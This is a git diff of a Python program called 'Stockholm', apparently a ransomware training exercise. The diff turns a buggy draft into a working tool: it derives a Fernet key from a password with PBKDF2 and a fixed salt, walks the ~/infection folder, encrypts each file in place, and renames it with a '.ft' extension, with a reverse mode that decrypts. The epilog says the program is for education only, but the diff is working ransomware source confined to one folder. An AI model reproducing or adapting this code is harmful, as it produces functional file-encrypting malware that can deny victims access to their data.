@@ -1,9 +1,15 @@
 import argparse
+from hashlib import pbkdf2_hmac
+from hashlib import sha256
 import typing as tp
 from colorama import Fore, Style
 import sys
 from cryptography.fernet import Fernet
 import os
+import base64
+
+SALT = b"stockholm"
+FOLDER = "infection"
 
 class Stockholm:
 	def __init__(self, key: str, reverse: bool, silent: bool, dry_run: bool):
@@ -40,21 +46,35 @@ class Stockholm:
 	def remove_file_extension(file: str) -> str:
 		return file[:-3]
 
+	def make_key_fernet_safe(self) -> bytes:
+		key = pbkdf2_hmac(
+			hash_name='sha256',
+			password=self.key.encode(),
+			salt=SALT,
+			iterations=100_000,
+			dklen=32
+		)
+		return base64.urlsafe_b64encode(key) 
+
 	def encrypt(self, file: str, cipher: Fernet) -> None:
 		if self.check_file_extension(file):
 			self.log("info", f"File '{file}' is excluded from encryption.")
 			return
-		with open(file, "rb") as f:
-			data = f.read()
-		encrypted_data = cipher.encrypt(data)
-		if self.dry_run:
-			self.log("success", f"Would encrypt '{file}'.")
-			return
-		with open(file) as f:
-			f.write(encrypted_data)
-		self.log("success", f"Encrypted '{file}'.")
-		os.rename(file, file + ".ft")
-  
+		try:
+			with open(file, "rb") as f:
+				data = f.read()
+			encrypted_data = cipher.encrypt(data)
+			if self.dry_run:
+				self.log("success", f"Would encrypt '{file}'.")
+				return
+			with open(file, "wb") as f:
+				f.write(encrypted_data)
+			os.rename(file, file + ".ft")
+			self.log("success", f"Encrypted '{file}'.")
+		except Exception as e:
+			self.log("error", f"Failed to encrypt '{file}'.")
+			self.log("error", f"Error: {e}")
+
 	def decrypt(self, file: str, cipher: Fernet) -> None:
 		if not self.check_file_extension(file):
 			self.log("info", f"File '{file}' is excluded from decryption.")
@@ -62,13 +82,29 @@ class Stockholm:
 		if self.dry_run:
 			self.log("success", f"Would decrypt '{file}'.")
 			return
-		with open(file, "rb") as f:
-			data = f.read()
-		decrypted_data = cipher.decrypt(data)
-		with open(self, "wb") as f:
-			f.write(decrypted_data)
-		os.rename(file, self.remove_file_extension(file))
-		self.log("success", f"Decrypted '{file}'.")
+		try:
+			with open(file, "rb") as f:
+				data = f.read()
+			decrypted_data = cipher.decrypt(data)
+			with open(file, "wb") as f:
+				f.write(decrypted_data)
+			os.rename(file, self.remove_file_extension(file))
+			self.log("success", f"Decrypted '{file}'.")
+		except Exception as e:
+			self.log("error", f"Failed to decrypt '{file}'.")
+			self.log("error", f"Error: {e}")
+
+	def run(self) -> None:
+		cipher = Fernet(self.make_key_fernet_safe())
+		for root, _, files in os.walk(os.path.expanduser("~/" + FOLDER)):
+			for file in files:
+				if not os.path.isfile(os.path.join(root, file)):
+					continue
+				file = os.path.join(root, file)
+				if self.reverse:
+					self.decrypt(file, cipher)
+				else:
+					self.encrypt(file, cipher)
 
 def main():
 	parser = argparse.ArgumentParser(
@@ -76,11 +112,13 @@ def main():
 		epilog='Stockholm is a simple encryption tool that uses a key to encrypt and decrypt files. This project is for educational purposes only. You should never use this type of program for malicious purposes.')
 	parser.add_argument('key', type=str, help='The key to use for encryption.')
 	parser.add_argument('-v', '--version', action='version', version='%(prog)s 0.0.42')
-	parser.add_argument('-r', '--reverse', type=str, help='Reverse the encryption.')
+	parser.add_argument('-r', '--reverse', action='store_true', help='Reverse the encryption.')
 	parser.add_argument('-s', '--silent', action='store_true', help='Silent mode.')
 	parser.add_argument('-u', '--dry-run', action='store_true', help='Dry run (no encryption - just printing what would be done).')
-	# add more help to the parser
 	args = parser.parse_args()
+ 
+	stockholm = Stockholm(args.key, args.reverse, args.silent, args.dry_run)
+	stockholm.run()
  
 if __name__ == '__main__':
 	main()
